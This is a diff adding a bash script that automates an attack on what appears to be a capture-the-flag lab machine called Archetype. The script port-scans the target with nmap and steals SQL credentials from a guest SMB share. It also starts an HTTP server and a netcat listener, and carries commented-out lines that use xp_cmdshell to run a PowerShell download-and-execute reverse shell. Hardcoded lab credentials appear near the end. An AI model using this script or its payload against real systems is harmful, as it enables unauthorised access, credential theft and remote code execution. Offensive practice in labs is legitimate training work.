@@ -1,0 +1,83 @@
+#!/bin/bash
+
+if [ $EUID -ne 0 ]; then
+  echo Please run as sudo.
+  exit 1
+fi
+
+locip () {
+  # tun0 UNKNOWN 10.10.14.59/23
+  declare m=$(ip --br -4 a s tun0) # yeah it's always tun0 on openvpn
+  m=${m%\/*}
+  m=${m##* }
+  echo $m
+}
+
+declare remote=10.10.10.27
+declare loc=$(locip)
+declare id
+declare pass
+
+scan () {
+  declare ip="$1"
+  if [ -z "$ip" ]; then
+    echo "usage: scan <ip>"
+    exit 1
+  fi
+  ports=$(nmap -p- --min-rate=1000  -T4 "$ip" | \
+    grep ^[0-9]     |  \
+    cut -d '/' -f 1 |  \
+    tr '\n' ','     |  \
+    sed s/,$//         \
+  )
+  if [ -z "$ports" ]; then
+    echo "No host (or ports) found."
+    exit 0
+  fi
+  # For a full list of all script run by -sC:
+  # <https://nmap.org/nsedoc/categories/default.html>
+  nmap -v -sC -sV --stats-every 10s -p$ports "$ip" -oN nmap.out
+}
+
+getidpass () {
+  declare ip="$1"
+  #smbget --guest smb://$ip/backups/prod.dtsConfig -O 
+  smbclient -N //$ip/backups -c 'get prod.dtsConfig'
+  declare line=$(grep Password prod.dtsConfig)
+  pass=${line#*Password=}
+  pass=${pass%%;*}
+  id=${line#*ID=}
+  id=${id%%;*}
+}
+
+serve () {
+  # 80 possibly because powershell restrictions
+  #iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+  ufw allow from "$remote" proto tcp to any port 80,443 
+  if [ -z "$(lsof -n -iTCP:80 | grep LIST)" ]; then
+    python3 -m http.server 80 &
+  else
+    echo Port 80 already listening
+  fi
+  if [ -z "$(lsof -n -iTCP:443 | grep LIST)" ]; then
+    nc -lvnp 443 &
+  else
+    echo Port 443 already listening
+  fi
+}
+
+#scan $remote
+#getidpass $remote
+serve
+
+#revshell=$(mktemp)
+#echo 'xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://'$loc'/shell.ps1\");"' > $revshell
+
+# TODO comment these out in final
+#id=ARCHETYPE/sql_svc
+#pass=M3g4c0rp123
+
+#mssqlclient.py $id:$pass@$remote -windows-auth -file $revshell
+
+#rm $revshell
+
